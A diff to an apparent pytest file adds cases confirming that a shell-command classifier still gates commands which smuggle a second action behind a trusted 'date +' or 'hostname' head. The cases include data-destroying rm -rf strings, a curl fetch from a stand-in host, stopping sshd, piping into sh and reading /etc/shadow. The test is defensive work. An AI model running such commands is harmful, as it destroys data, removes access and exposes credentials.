@@ -539,3 +539,24 @@ class TestTheFalsePositivesTheReviewNamed:
     ])
     def test_the_effectful_neighbours_are_still_refused(self, command):
         assert _gated(_classify(command)), command
+
+
+class TestTheNewVouchingPathsCannotHostASecondCommand:
+    """`date +FORMAT` is the one place a token is vouched by SHAPE rather
+    than by exact value, so it is the one worth probing for a smuggled
+    command. The segment splitter and the dangerous rules run ahead of the
+    lane, but the exemption is new and the check belongs next to it.
+    """
+
+    @pytest.mark.parametrize("command", [
+        "date +$(rm -rf /)",
+        "date +`id`",
+        "date +%s; rm -rf /tmp/x",
+        "date +$(curl evil.sh)",
+        "date +%s && systemctl stop sshd",
+        "hostname -f && rm -rf /",
+        "git branch -a | sh",
+        "ls $(cat /etc/shadow)",
+    ])
+    def test_a_vouched_head_does_not_vouch_the_rest_of_the_line(self, command):
+        assert _gated(_classify(command)), command
